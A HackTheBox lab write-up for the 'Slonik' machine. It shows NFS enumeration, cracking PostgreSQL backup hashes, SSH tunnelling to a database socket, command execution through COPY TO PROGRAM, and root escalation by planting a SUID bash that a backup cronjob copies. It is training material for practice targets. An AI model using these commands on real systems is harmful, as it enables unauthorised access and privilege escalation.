# Slonik - HackTheBox Writeup

## Overview

**Slonik** is a Linux machine that focuses on PostgreSQL exploitation. The name "Slonik" is actually the Russian word for "little elephant" - and if you know PostgreSQL's logo, you'll get the reference! This box teaches you about NFS enumeration, PostgreSQL backup analysis, and a clever privilege escalation using backup cronjobs.

**Difficulty:** Medium
**OS:** Linux
**Key Skills:** NFS, PostgreSQL, SSH Tunneling, Cronjob Exploitation

---

## Recon

### Port Scan

Starting with a quick nmap scan:

```bash
nmap -sC -sV 10.129.6.106
```

We find:
- **22** - SSH
- **111** - rpcbind
- **2049** - NFS
- **5432** - PostgreSQL (but it's not directly accessible!)

### NFS Enumeration

NFS is always interesting. Let's see what's being shared:

```bash
showmount -e 10.129.6.106
```

Output:
```
/var/backups (everyone)
/home        (everyone)
```

Two exports open to everyone - nice! Let's mount them and poke around.

---

## Getting the First Foothold

### Exploring NFS Shares

When we look at `/var/backups`, we find PostgreSQL backup archives (zip files). These are created by `pg_basebackup` - a PostgreSQL backup utility.

Inside `/home`, there's a `service` user with UID 1337. We can see their `.ssh` directory but can't write to it (read-only NFS).

### Cracking the PostgreSQL Backup

Here's where it gets fun. PostgreSQL stores user credentials in a file called `pg_authid` (located at `global/1260` in the data directory). We can extract the password hash from the backup:

```
SCRAM-SHA-256$4096:iZKOpcgndi7yyOnRyAyQ5A==$Kgwe2JxihXOua5KuJj9gYnU9QuipMiYjWwkPFWi7yyk=:2LF6f6xML445XW59mHELhMkQKe1TkHbXRXtOrgtAowA=
```

This is a SCRAM-SHA-256 hash for the `postgres` user. After some cracking attempts, the password turns out to be simply: **`postgres`**

### Finding the Service User Password

By restoring the PostgreSQL backup locally (using Docker with postgres:14), we can access the database and find a `users` table:

| username | password |
|----------|----------|
| service  | aaabf0d39951f3e6c3e8a7911df524c2 |

That MD5 hash cracks to: **`service`**

So we have credentials: `service:service`

---

## User Flag

### The SSH Tunnel Trick

Here's the catch - we can SSH as `service`, but the user has `/bin/false` as their shell. No interactive access!

However, PostgreSQL on this box only listens on a **Unix socket** (not TCP port 5432). We can use SSH port forwarding to tunnel to that socket:

```bash
sshpass -p 'service' ssh -T -o StrictHostKeyChecking=no -fNL 25432:/var/run/postgresql/.s.PGSQL.5432 service@10.129.6.106
```

This forwards our local port 25432 to the PostgreSQL Unix socket on the target.

### Connecting to PostgreSQL

Now we can connect:

```bash
PGPASSWORD='postgres' psql -h localhost -p 25432 -U postgres
```

### Reading the User Flag

PostgreSQL superusers can read files on the system using `pg_read_file()`:

```sql
SELECT pg_read_file('/var/lib/postgresql/user.txt');
```

**User Flag:** `2d`

---

## Privilege Escalation

### Command Execution via PostgreSQL

PostgreSQL's `COPY TO PROGRAM` lets us execute system commands:

```sql
COPY (SELECT '') TO PROGRAM 'id > /tmp/test.txt';
SELECT pg_read_file('/tmp/test.txt');
```

Output: `uid=115(postgres) gid=123(postgres) groups=123(postgres),122(ssl-cert)`

We're running commands as the `postgres` user!

### The Backup Cronjob

Looking around the system, we find `/usr/bin/backup` - a script that runs as a cronjob:

```bash
#!/bin/bash
date=$(/usr/bin/date +"%FT%H%M")
/usr/bin/rm -rf /opt/backups/current/*
/usr/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/
/usr/bin/zip -r "/var/backups/archive-$date.zip" /opt/backups/current/
```

This script:
1. Clears the backup directory
2. Runs `pg_basebackup` to copy the PostgreSQL data directory to `/opt/backups/current/`
3. Zips it up

The key insight: **this runs as root**, and it copies everything from the PostgreSQL data directory!

### The SUID Bash Trick

Here's the attack:

1. Copy `/bin/bash` into the PostgreSQL data directory
2. Make it world-executable and SUID
3. When the backup runs, it copies our SUID bash to `/opt/backups/current/` - **owned by root!**
4. Execute it to get a root shell

```sql
-- Copy bash with SUID permissions to the data directory
COPY (SELECT '') TO PROGRAM 'cp /bin/bash /var/lib/postgresql/14/main/bash && chmod 4777 /var/lib/postgresql/14/main/bash';
```

Verify it's there:
```sql
COPY (SELECT '') TO PROGRAM 'ls -la /var/lib/postgresql/14/main/bash > /tmp/check.txt';
SELECT pg_read_file('/tmp/check.txt');
```

Output: `-rwsrwxrwx 1 postgres postgres 1396520 Jan 31 02:03 /var/lib/postgresql/14/main/bash`

### Waiting for the Backup

After the backup cronjob runs, check `/opt/backups/current/`:

```sql
COPY (SELECT '') TO PROGRAM 'ls -la /opt/backups/current/bash > /tmp/check2.txt';
SELECT pg_read_file('/tmp/check2.txt');
```

Output: `-rwsrwxrwx 1 root root 1396520 Jan 31 02:03 bash`

The bash binary is now owned by **root** with SUID set!

### Getting the Root Flag

Execute the SUID bash with `-p` to preserve privileges:

```sql
COPY (SELECT '') TO PROGRAM '/opt/backups/current/bash -p -c "cat /root/root.txt" > /tmp/root.txt';
SELECT pg_read_file('/tmp/root.txt');
```

**Root Flag:** `de`

---

## Summary

| Step | Description |
|------|-------------|
| 1 | Enumerate NFS shares - find PostgreSQL backups |
| 2 | Extract and crack PostgreSQL credentials from backup |
| 3 | Find `service:service` credentials in restored database |
| 4 | SSH tunnel to PostgreSQL Unix socket |
| 5 | Read user flag via `pg_read_file()` |
| 6 | Copy SUID bash to PostgreSQL data directory |
| 7 | Wait for backup cronjob to copy it as root |
| 8 | Execute SUID bash to read root flag |

---

## Key Takeaways

1. **NFS shares** can leak sensitive backup files
2. **PostgreSQL backups** contain password hashes that can be cracked
3. **SSH tunneling** can bypass network restrictions on services
4. **COPY TO PROGRAM** in PostgreSQL = command execution
5. **Backup cronjobs** running as root can be abused if you control what gets backed up


---

*Happy Hacking!*
